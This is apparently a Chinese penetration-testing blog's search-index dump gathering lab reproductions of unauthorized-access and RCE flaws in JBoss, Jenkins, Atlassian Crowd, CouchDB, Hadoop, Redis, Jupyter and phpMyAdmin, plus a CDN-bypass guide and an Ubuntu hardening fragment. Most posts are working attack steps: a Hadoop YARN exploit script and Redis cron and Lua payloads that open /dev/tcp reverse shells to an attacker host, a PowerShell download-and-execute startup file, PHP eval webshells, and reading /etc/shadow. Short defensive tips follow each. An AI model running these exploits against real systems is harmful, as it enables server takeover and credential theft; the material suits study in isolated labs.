http://192.168.0.100:8080/ # 进入控制页 JMX Console http://192.168.0.100:8080/jmx-console/ 2.点击jboss.deployment进入应用部署页面 3.使用apache搭建远程木马服务器(这里在kali上搭建) # war马的制作方式：https://www.peekeyes.com/2020/01/13/%E5%88%B6%E4%BD%9Cwar%E6%9C%A8%E9%A9%AC%E5%B9%B6%E4%B8%94%E6%8B%BF%E4%B8%8Bwebshell/ jar cvf shell.war shell.jsp 4.通过addurl参数进行木马的远程部署 地址写远程服务器war马的地址 成功部署 5.连接木马 http://192.168.0.100:8080/shell/shell.jsp 防护 对jmx控制页面访问添加访问验证。 进行JMX Console 安全配置。 ","date":"2020-05-26","objectID":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:0:6","tags":["JBoss","渗透测试","中间件漏洞","未授权访问"],"title":"jboss常见漏洞复现","uri":"/jboss%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"漏洞简介及危害 默认情况下 Jenkins面面板中用户可以选择执行脚本界面来操作一些系统层命令,攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务,通过脚本执行行界面从而获取服务器权限。 环境搭建 # 下载地址： https://www.jenkins.io/download/ # 可以直接下载war包 java -jar jenkins.war # 运行 # wget http://mirrors.jenkins.io/debian/jenkins_1.621_all.deb # 下载 dpkg -i jenkins_1.621_all.deb # 安装 sudo apt-get -f --fix-missing install # 如果有报依赖项的错误时执行行行 service jenkinis start # 开启Jenkins服务 浏览器器访问http://192.168.0.100:8080/ 未授权访问测试 访问http://192.168.0.100:8080/manage可以看到没有任何限制可以直接访问 Jenkins未授权访问写shell 1.点击“脚本命令行” 2.执行系统命令 println \"whoami\".execute().text 3.利用“脚本命令行”写webshell,(需要一定的权限且知道网站绝对路径)，点击运行,写入成功 new File (\"/var/www/html/shell.php\").write('\u003c?php phpinfo(); ?\u003e'); 4.访问shell.php， 测试成功 CVE-2017-1000353 这是一个java反序列化漏洞 执行如下命令启动jenkins 2.46.1： docker-compose up -d 等待完全启动成功后，访问http://your-ip:8080即可看到jenkins已成功运行，无需手工安装。 原理 参考： https://blogs.securiteam.com/index.php/archives/3171 测试 1.生成序列化字符串 # 参考 https://github.com/vulhub/CVE-2017-1000353 # 首先下载POC生成工具： https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar # 执行下面命令，生成字节码文件 java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser \"touc /tmp/success\" # jenkins_poc.ser是生成的字节码文件名 # \"touch ...\"是待执行的任意命令 # 生成jenkins_poc.ser文件，这就是序列化字符串。 2.生成jenkins_poc.ser文件，这就是序列化字符串。 # 下载 https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py # Python3执行 python3 exploit.py http://192.168.0.100:8080 jenkins_poc.ser # 将刚才生成的字节码文件发送给目标 3.进入docker容器发现文件创建成功 CVE-2018-1000861 Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。 通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。 测试 执行如下命令启动一个Jenkins 2.138，包含漏洞的插件也已经安装： docker-compose up -d 使用 @orangetw 给出的一键化POC脚本，发送如下请求即可成功执行命令： http://192.168.0.100:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript ?sandbox=true \u0026value=public class x { public x(){ \"touch /tmp/success\".execute() } } # 请求替换到burp拦截的数据包中 数据包如下 GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true\u0026value=public%20class%20x%20{public%20x(){%22touch%20/tmp/CVE-2018-1000861_is_success%22.execute()}} HTTP/1.1 Host: 192.168.0.100:8080 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: JSESSIONID.a3c40b9a=node010r4vkf3cix27hr5qd9qvw5y41.node0; screenResolution=1920x1080 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 进入容器: docker-compose exec jenkins bash,看到 /tmp/success文件创建成功 配置方面的安全问题 1.允许任意账户注册 带来的安全问题 关闭用户注册 2.允许匿名访问带来的问题 建议关闭 jenkins的日志功能不是很好（可以使用代理，并进行操作的记录） 安全建议 使用最新版的jenkins 关闭匿名访问 关闭用户注册功能 用户严格授权 最小化插件，相关插件使用最新版 使用nginx代理jenkins，不要直接暴露在公网 参考：https://www.secpulse.com/archives/2166.html ","date":"2020-05-26","objectID":"/jenkins%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/:0:0","tags":["Jenkins","未授权访问"," CVE-2017-1000353","CVE-2018-1000861"],"title":"Jenkins一些安全问题","uri":"/jenkins%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"},{"categories":["渗透测试"],"content":"漏洞概述 Atlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为用用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了了pdkinstall开发插件,使其存在安全漏漏洞洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件,执行任意代码/命令,从而获得服务器权限 环境搭建 wget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-3.4.3.zip unzip atlassian-crowd-3.4.3.zip cd atlassian-crowd-3.4.3 vim crowd-webapp/WEB-INF/classes/crowd-init.properties #修改crowd-init.properties 配置文件，设置主目录 crowd.home=/var/crowd-home # 主目录位置(根据自己的写) # 执行启动命令 ./start_crowd.sh 浏览器访问http://192.168.0.100:8095 点击Set up Crowd 这里去官网申请试用30天https://my.atlassian.com/products/index并填写到license 进行下一步安装,直到安装完成。 未授权访问测试 安装完成之后在插件目录会有一些插件bundled-plugins 上传一个标准的插件,来自atlassian-bundled-plugins中的applinks-plugin-5.4.12.jar curl --form \"file_cdl=@applinks-plugin-5.4.12.jar\" http://192.168.0.100:8095/crowd/admin/uploadplugin.action -v Atlassian Crowd RCE 该漏洞源于网络系统或产品未对输入的数据进行正确的验证。受影响的产品及版本包括：Atlassian Crowd 2.1.x版本，3.0.5之前的3.0.x版本，3.1.6之前的3.1.x版本，3.2.8之前的3.2.x版本，3.3.5之前的3.3.x版本，3.4.4之前的3.4.版本；Atlassian Crowd Data Center 2.1.x版本，3.0.5之前的3.0.x版本，3.1.6之前的3.1.x版本，3.2.8之前的3.2.x版本，3.3.5之前的3.3.x版本，3.4.4之前的3.4.版本。 漏洞利用脚本：https://github.com/jas502n/CVE-2019-11580 git clone https://github.com/jas502n/CVE-2019-11580 cd CVE-2019-11580/ python CVE-2019-11580.py http://192.168.0.100:8095 # 通过浏览器访问链接测试其他命令 curl http://192.168.0.100:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow 防御手段 设置访问/crowd/admin/uploadplugin.action的源ip 升级最新版本(3.5.0以上)。 ","date":"2020-05-26","objectID":"/atlassian-crowd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":["Atlassian Crowd","未授权访问","远程命令执行"],"title":"Atlassian Crowd未授权访问漏洞","uri":"/atlassian-crowd%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞简介以及危害 Apache CouchDB是一个开源数据库,专注于易用性和成为\"完全拥抱web的数据库\"。它是一个使用JSON作为存储格式,JavaScript作为查询语言,MapReduce和HTTP作为API的NoSQL数据库。 应用广广泛,如BBC用在其动态内容展示平台,Credit Suisse用在其内部的商品部⻔的市场框架,Meebo,用在其社交平台(web和应用程序),默认会在5984端口开放Restful的API接口口,如果使用 SSL的话就会监听在6984端口,用于数据库的管理功能。其HTTP Server默认开启时没有进行行行验证,而且绑定在0.0.0.0,所有用户均可通过API访问导致未授权访问。 在官方方配置文文档中对HTTP Server的配置有WWW-Authenticate:Set this option to trigger basic-auth popup on unauthorized requests,但是很多用户都没有这么配置,导致漏洞产生。 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。 影响版本：小于 1.7.0 以及 小于 2.1.1 漏洞环境 vulnhub 漏洞利用 CVE-2017-12636是需要登录用户方可触发，如果不知道目标管理员密码，可以利CVE-2017-12635CVE-017-12635先【增加一个管理员用户】，如果无须帐号密码，就可通过未授权访问进行命令执行 同样，记得在Burp的拦截端口添加一个5984 进入环境，并启动 cd couchdb/CVE-2017-12636/ docker-compose up -d 未授权访问测试 curl http://192.168.0.100:5984 curl http://192.168.0.100:5984/_config 任意命令执行漏洞 # 本机python运行http服务(可以不运行这个步骤，这里只是做curl测试用的) python -m SimpleHTTPServer 8888 1.6.0 下 #依次执行如下命令 curl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '\"curl http://192.168.0.105:8888/test.php\"' # 这里可以执行任意命令 #curl -X PUT 'http://192.168.0.100:5984/_config/query_servers/cmd' -d '\" cat /etc/passwd \u003e\u003e tmp/ext_passwd\"' curl -X PUT 'http://192.168.0.100:5984/vultest' # 添加一个Database和Document curl -X PUT 'http://192.168.0.100:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' curl -X POST 'http://192.168.0.100:5984/vultest/_temp_view?limit=11' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type: application/json' # 在这个Database里查询，将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行 2.1.0 下 # 2.1.0中修改了1.6.0用到的两个API # Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。我们带上账号密码访问/_membership即可 curl http://\u003cyour-ip\u003e:5984/_membership # 利用(跟1.6.0类似) curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '\"id \u003e/tmp/CVE-2017-12636_is_success\"' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest' #先增加一个Database和一个Document curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' #Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}' -H \"Content-Type: application/json\" #增加_view的同时即触发了query_servers中的命令。 exp地址 https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py nmap扫描 nmap -p 5984 --script \"couchdb-stats.nse\" \u003ctarget_ip\u003e 防御手段 绑定指定ip 设置访问密 ","date":"2020-05-26","objectID":"/couchdb%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:0","tags":["CouchDB","未授权访问","命令执行","CVE-2017-12635","CVE-2017-12636"],"title":"CouchDB未授权访问\u0026命令执行","uri":"/couchdb%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["渗透测试"],"content":"漏洞简介以及危害 Hadoop是一个由Apache基金会所开发的分布式系统基础架构,由于服务器器直接在开放了了 Hadoop 机器器 HDFS 的 50070 web 端口及部分默认服务口口,黑客可以通过命令行操作多个目录下 的数据,如进行删除,下载,目录浏览甚至命令行行等操作,产生极大的危害。 环境 vulnhub 测试 启动环境 docker-compose up -d 访问 http://192.168.0.100:8088/cluster 通过REST API命令执行 利用过程： 在本地监听端口 \u003e 创建Application \u003e 调用Submit Application API提交 1.本机监听 nc -lvvp 8888 2.直接本机执行EXP：python exp.py import requests target = 'http://192.168.0.100:8088/' lhost = '192.168.0.105' # put your local host ip here, and listen at port 8888 url = target + 'ws/v1/cluster/apps/new-application' resp = requests.post(url) app_id = resp.json()['application-id'] url = target + 'ws/v1/cluster/apps' data = { 'application-id': app_id, 'application-name': 'get-shell','am-container-spec': { 'commands': { 'command': '/bin/bash -i \u003e\u0026 /dev/tcp/%s/8888 0\u003e\u00261' % lhost, }, }, 'application-type': 'YARN', } requests.post(url, json=data) 3.反弹shell成功 防御手段 如无必要, 关闭 Hadoop Web 管理⻚面。 开启身份验证 ,防止未经授权用户访问。 设置“安全组”访问控制策略,将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访包括 50070 以及 WebUI 等相关端口。 ","date":"2020-05-26","objectID":"/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":["Hadoop","未授权访问"],"title":"Hadoop未授权访问漏洞","uri":"/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"准备 1.下载编译 wget http://download.redis.io/releases/redis-6.0.3.tar.gz tar xzf redis-6.0.3.tar.gz cd redis-6.0.3 make 2.拷贝二进制文件 cd src/ cp redis-server /usr/bin cp redis-cli /usr/bin cd .. cp redis.conf /etc/ 3.修改redis.conf, 开启外部访问，关闭保护模式(保护模式下运行redis是利用不成功滴) 4.启动redis服务 redis-server /etc/redis.conf # 或者直接以非保护模式运行也可以 ./redis_server --protected-mode no 5.连接redis的方式 # nc nc 1.1.1.1.10 6379 -vv # telent #或redis-cli连接 redis-cli -h 192.168.0.100 常用命令 # 查看里面的key和其对应的值 keys * get key # 获取备份路径 config get dir # 获取备份文件名 config get dbfilename save # 保存数据到备份路径(dir+dbfilename) # 设置备份路径 config set dir /root/ # 可以移动到root，然后访问（如果能访问，就是root权限 --\u003e可用来判断权限） # 设置备份文件名 config set dbfilename filename # 设置键值对 set keyname value # 获取键值对 get keyname # 持久化(保存到磁盘) save ","date":"2020-05-26","objectID":"/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:1:0","tags":["渗透测试","redis","未授权访问"],"title":"redis漏洞利用","uri":"/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"测试 一、写文件(利用未授权访问) 测试环境：centos 1.crontab计划任务反弹shell root权限运行redis 1.本机监听端口 nc -lvvp 4444 2.利用redis生成计划任务配置文件 set -.- \"\\n\\n\\n* * * * * bash -i \u003e\u0026 /dev/tcp/192.168.0.106/5555 0\u003e\u00261\\n\\n\\n\" config set dir /var/spool/cron/ config set dbfilename root save 3.本机获得反弹shell Note: 当目标主机为centos时可以反弹shell, 而ubuntu和debian均无法成功反弹shell。 原因：由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划。 2.直接写入公钥 root权限运行redis， 且目标主机开启了ssh密钥登录 # 本机先生成密钥 ssh-keygen -t rsa # 公钥内容导入key.txt文件 (echo -e \"\\n\\n\"; cat /root/.ssh/id_rsa.pub; echo -e \"\\n\\n\") \u003e key.txt # config set dir /root/.ssh/ config set dbfilename authorized_keys set test6 \"\\n\\n\\nssh key\\n\\n\\n ssh-rsa xxxxxxxxxxxxx\" (公钥的值) save # 然后本机直接连接目标 ssh -o StrictHostKeyChecking=no 192.168.0.100 同时也要注意系统的乱码问题 3.低权限写入WebShell 需要知道网站路径 config set dir /var/www/html/ # 需要知道网站的绝对路径 config set dbfilename 1.php set 1 \"\u003c?php eval($_POST[1]); ?\u003e\" save # 访问webshell 4.开机自启目录 前提：redis部署在windows主机上 # 写入批处理文件到Administrator用户的开机启动目录 # 使用powershell远程下载执行我们的程序 config set dir \"C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/\" config set dbfilename add.bat set xx \"\\r\\n\\r\\npowershell.exe -nop -w hidden -c \\\"IEX((New-ObjectNet.WebClient).DownloadString('http://xxx.xx.xxxx/add'))\\\"\\r\\n\\r\\n\" save 拓展攻击方法 信息泄漏(很多redis没设置密码，寻找敏感信息) 配合ssrf 本地lua代码 本地提权 等等 5.写入挖矿进程 nmap检测 nmap -p 6379 --script redis-info 192.168.0.100 #地址:https://svn.nmap.org/nmap/scripts/redis-info.nse 安全检查 #1.查看redis运行的用户权限 ps -aux |grep redis #2.查看所有用户ssh验证文件是否异常 /user/.ssh/authorized_keys #3.查看crontab /var/spoof/cron/ #4.查看crontab的日志 tail /var/log/cron 二、Redis-RCE 利用用前提是获取redis访问权限,也就是基于redis未授权访问 1.redis主从同步rce 使用范围redis 4.x-5.0.5 在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令 git clone https://github.com/Ridter/redis-rce.git git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git # 编译so文件 cd RedisModules-ExecuteCommand/ make # 运行sss python redis-rce.py -r \u003c目标地址\u003e -L \u003c本机地址\u003e -f module.so # 执行成功后可以选择生成一个交互的shell，或者重新反弹一个shell 2.反序列化rce 当遇到 redis 服务器写文件无法 getshell，可以查看redis数据是否符合序列化数据的特征。 jackson：关注 json 对象是不是数组，第一个元素看起来像不像类名，例如[\"com.blue.bean.User\",xxx] fastjson：关注有没有 @type 字段 jdk：首先看 value 是不是 base64，如果是解码后看里面有没有 java 包名 https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q 3.lua rce 适用于高权限运行低版本redis的lua虚拟机，写文件失败时进行尝试 使用info server 和 eval “return _VERSION” 0 命令可以查看当前redis版本和编译信息。 exp https://github.com/QAX-A-Team/redis_lua_exploit/ 修改redis_lua.py中目标地址为靶机的地址和端口 运行exp 执行成功后就可以进行命令执行了，这里反弹shell eval \"tonumber('/bin/bash -i \u003e\u0026 /dev/tcp/192.168.0.105/5555 0\u003e\u00261', 8)\" 0 三、redis密码爆破 1.使用redis-cli连接，使用-a参数指定密码操作。 redir-cli -h 192.168.0.100 -a admin123 # 这个好像没这么实用感觉，也许可以写成脚本批量跑 2.msf的auxiliary/scanner/redis/redis_login模块 use auxiliary/scanner/redis/redis_login set rhost ... set threads ... set pass_file xxxxxxx.txt run 3.hydra # 还是hydra好用，速度还快 hydra -P redis_pass.txt redis://192.168.0.100 ","date":"2020-05-26","objectID":"/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:0","tags":["渗透测试","redis","未授权访问"],"title":"redis漏洞利用","uri":"/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"防御手段 禁止root运行redis 设置账户密码认证 服务部署使用单独低权限账户 添加IP访问限制(bind),并更更改默认6379端口 redis在默认情况下，是不会生成日志文件的，所以需要修改配置文件，让redis生成日志，以及设置日志等级 保证 authorized_keys 文件的安全（chmod 400 ~/.ssh/authorized_keys） 设置防火墙策略　参考链接 https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q https://www.freebuf.com/column/158065.html ","date":"2020-05-26","objectID":"/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:3:0","tags":["渗透测试","redis","未授权访问"],"title":"redis漏洞利用","uri":"/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["渗透测试"],"content":"简介及危害 Jupyter Notebook(此前被称为 IPython notebook)是一一个交互式笔记本,支支持运行行行 40 多种编 程语言言。 如果管理理员未为Jupyter Notebook配置密码,将导致未授权访问漏漏洞洞,游客可在其中创建一一 个console并执行行行任意Python代码和命令。 环境介绍 # 目标 环境来源：https://github.com/vulhub/vulhub/blob/master/jupyter/notebook-rce/ ip地址： 192.168.0.100 开始测试 1.运行测试环境： docker-compose up -d 2.访问目标地址 http://192.168.0.100:8888 3.New \u003e Terminal 创建控制台：可以直接执行任意命令 4.后面就直接执行任意命令，比如反弹shell等 # 本机监听 nc -lvp 5555 # 目标执行 bash -i \u003e\u0026 /dev/tcp/x.x.x.x/8080 0\u003e\u00261 防御手段 开启身份验证, 防止止未经授权用用户访问 访问控制策略略, 限制IP访问, 绑定固定IP ","date":"2020-05-25","objectID":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/:0:0","tags":["未授权访问","渗透测试","Jupyter Notebook"],"title":"Jupyter Notebook 未授权访问漏洞简单复现","uri":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"1.查看secure_file_priv值 show global variables like '%secure_file_priv%'; # show global variables like '%secure%'; # 此开关默认为NULL：即不允许导入导出 # 没有具体值时：表示不对mysqld 的导入|导出做限制 # 值为/tmp/ ：表示限制mysqld 的导入|导出只能发生在/tmp/目录下 2.查询操作日志存放路径 show variables like 'general_log%'; # 操作日志默认也是关闭的 3.首先打开操作日志记录 set global general_log = 'ON'; 4.设置操作记录日志路径(前提是获取到了绝对路径) # set global general_log_file='路径地址'; # 选择网站的目录里面 set global general_log_file='D:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\xx.php' 5.执行sql语句，mysql会将执行的语句内容记录到我们指定的文件中，就可以getshell了 select '\u003c?php @eval($_POST[1]);?\u003e'; 6.访问webshell，进行后续操作 ","date":"2020-05-25","objectID":"/phpmyadmin%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99webshell/:0:0","tags":["渗透测试","phpMyadmin","secure-file-priv"],"title":"phpMyAdmin突破secure-file-priv写WebShell","uri":"/phpmyadmin%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99webshell/"},{"categories":["渗透测试"],"content":"在没有CDN的情况下，直接ping或nslookup或dig即可得到真实IP地址，但是有的站点使用了CDN。 两种简单检测有无CDN的方法： 多地ping nslookup 检测（如果下方域名解析出现了多个ip的话，基本就确定这个网站使用了CDN服务） 一、DNS历史解析记录 相关查询网站： # iphistory： https://viewdns.info/iphistory/ # DNS查询： https://dnsdb.io/zh-cn/ # 微步在线： https://x.threatbook.cn/ # 域名查询： https://site.ip138.com/ # DNS历史查询： https://securitytrails.com/ # Netcraft： https://sitereport.netcraft.com/?url=github.com # SecurityTrail 二、查找子域名 重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： 1、搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具，如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ https://dnsdb.io/zh-cn/ https://x.threatbook.cn/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute:https://github.com/lijiejie/ Sublist3r:https://github.com/aboul3la/Sublist3r 其他工具 三、网站邮件头信息 邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。 四、网络空间安全引擎搜索 关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP # 钟馗之眼： https://www.zoomeye.org # Shodan： https://www.shodan.io # Fofa： https://fofa.so # 其他 五、利用SSL证书寻找真实IP 证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。 SSL证书搜索引擎： # Censys 证书搜索 https://censys.io/ipv4?q=github.com # 其他 六、国外主机解析域名 大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有 1.国外多地ping工具： https://asm.ca.com/zh_cn/ping.php http://host-tracker.com/ http://www.webpagetest.org/ https://dnscheck.pingdom.com/ 2.自己挂代理 七、扫描全网 通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP 1、ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。 https://github.com/zmap/zmap 2、Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。 https://github.com/robertdavidgraham/masscan 扫描全网开放特定端口的IP，然后获取他们的特定页面的HTM源代码，用这些源代码和目标网站的特定页面的HTM源代码做对比，如果匹配上来了，就很可能是目标网站的真实P，工具匹配会匹配出来很多，最后还是要人工筛选。 八、配置不当导致绕过 在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。 案例1：为了方便用户访问，我们常常将www.test.com 和 test.com 解析到同一个站点，而CDN只配置了www.test.com，通过访问test.com，就可以绕过 CDN 了。 案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。 九、遗留文件 遗留文件（比如google镜像，百度镜像） 比如遗留文件中: phpinfo的server_ddr字段， http_x_forwarded_for 十、其他工具 # fuckcdn https://github.com/Tai7sy/fuckcdn # w8fuckdn https://github.com/boy-hack/w8fuckcdn 十一、以量打量 以量打量（需要肉鸡，cdn的流量用完就显示真实ip） ps：这个方法，额，也算是个方法吧…… 十二、其他方法 1.网站漏洞 比如有代码执行漏洞、SSRF、存储型的XSS都可以让服务器主动访问我们预设的web服务器，那么就能在日志里面看见目标网站服务器的真实IP 2.配合本地hosts文件 用超级ping 扫子域名 再继续、 及get-site-ip获取 (修改host的映射，如能正常访问，这ip就是正确的，进一步使用代理来找出真是ip) 十三、一键干死CDN 包含了夸张因素，针对大公司的效果比较好，体量小的网站，基本搜不到 1.先查看网站logo的hash值 这里python2来计算： import mmh3 # mmh3安装需要先安装vc++4.0 import requests response = requests.get('https://www.xiaodi8.com/img/favicon.ico') favicon = response.content.encode('base64') hash = mmh3.hash(favicon) print 'http.favicon.hash:'+str(hash) # 可以ico文件，也可以是其他特征明显的图片等 2.然后shodan搜索： # 对特征明显的图片等的hash进行搜索 http.favicon.hash:-1507567567 参考文章 https://mp.weixin.qq.com/s/JkqLu0SBcOGIq7JdLzj8Uw # ByPass, 我在此基础上补充了自己之前的内容 https://www.cnblogs.com/zuoxiaolongzzz/p/12496467.html # 通过shodan搜索相同favicon.ico的网站 https://www.cnblogs.com/miaodaren/p/9177379.html # Shodan的http.favicon.hash语法详解与使用技巧 ","date":"2020-05-25","objectID":"/%E7%BB%95%E8%BF%87cdn%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9Eip/:0:0","tags":["CDN","渗透测试"],"title":"绕过CDN寻找真实IP","uri":"/%E7%BB%95%E8%BF%87cdn%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9Eip/"},{"categories":["Linux"],"content":"142-安全设置 Linux默认安装已经很安全，当很多的了解安全仍非常必要 打造一个相当安全的系统（增加入侵者的成本，安全也是要考虑成本的） 大部分的安全事件来自于内部员工和已经离职的员工 防护思路 风险评估：攻击面 制定策略：最小化、明确需求 安全管理：安全是管理 应急预案：突发事件 威胁情报：了解安全行业 常见错误理解 安全是安全从业者的事情 为了安装简单，装所有的包，开所有的服务(版本号、banner信息) 有了边界防火墙则不需要主机防火墙 随意开放各种访问方式(后门) 公司内部网络是安全的 ","date":"2020-05-20","objectID":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/:0:0","tags":["ubuntu","UFW","文件加密","AppArmor","ClamAV"],"title":"ubuntu server-安全相关设置","uri":"/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/"},{"categories":["Linux"],"content":"帐号管理 用户管理是系统安全最重要的方面 密码策略 权限控制 Ubuntu默认禁用root帐号 使用不匹配任何加密值的密码，无法直接登陆(sudo) 设置密码之后即可启用root登录 安装过程创建的用户帐号默认属于sudo组 sudo passwd # 设置root密码(还是不建议使用root登录系统) sudo passwd -l root # 禁用root帐号密码(用完之后解锁: -u) sudo passwd -u root 增加管理员帐号 sudo usermod -aG sudo xps # 加入sudo组 sudo viudo # 本质是编辑 /etc/sudoers sudo su # 尽量减少管理员帐号数量 # 离职手续办完之前，要把他的帐号禁用然后逐渐删除 多用户环境下，用户主目录默认权限是全局可读 ls -ld /home/username # 手动修改权限(不建议-R，会有一些使用的问题) sudo chmod 0750 /home/username # 预先修改配置（新添加的帐号权限都确定了） sudo vi /etc/adduser.conf DIR_MODE=0750 # 再添加用户，主目录权限就是我们规定的了 sudo adduser username 密码复杂度 # 